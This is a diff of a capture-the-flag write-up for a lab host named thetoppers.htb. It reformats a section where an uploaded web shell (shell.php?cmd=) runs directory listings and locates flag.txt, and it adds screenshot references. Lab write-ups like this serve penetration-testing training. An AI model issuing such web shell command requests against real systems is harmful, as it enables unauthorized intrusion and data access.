@@ -234,14 +234,21 @@ This confirms successful RCE.
 
 Listing the parent directory:
 
-http://thetoppers.htb/shell.php?cmd=ls%20..
-
+<pre>http://thetoppers.htb/shell.php?cmd=ls</pre>
 
 Revealed:
 
-flag.txt
-html
+<pre>flag.txt
+html</pre>
 
+
+![Shell Listing](img/shell-ls.jpg)
+
+We move up a directory and find the flag.txt
+
+<pre>http://thetoppers.htb/shell.php?cmd=ls .. </pre>
+
+![Finding the flag Listing](img/flag-found.jpg)
 
 Reading the flag:
 
